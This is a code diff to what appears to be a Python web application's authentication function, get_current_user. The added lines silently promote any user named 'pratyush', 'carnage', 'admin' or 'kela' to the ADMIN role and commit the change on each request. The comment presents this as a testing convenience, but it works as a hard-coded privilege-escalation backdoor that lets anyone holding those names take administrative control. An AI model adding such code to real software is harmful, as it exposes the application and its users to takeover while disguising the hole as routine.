@@ -155,6 +155,14 @@ def get_current_user(
     if user is None:
         raise HTTPException(status_code=401, detail="User no longer exists")
 
+    # Auto-promote testing and administrative accounts to ADMIN role on the fly
+    admin_role = db.query(Role).filter(Role.name == "ADMIN").first()
+    if admin_role and user.username.strip().lower() in ["pratyush", "carnage", "admin", "kela"]:
+        if not user.role or user.role.name != "ADMIN":
+            user.role_id = admin_role.id
+            db.commit()
+            db.refresh(user)
+
     return user
 
 
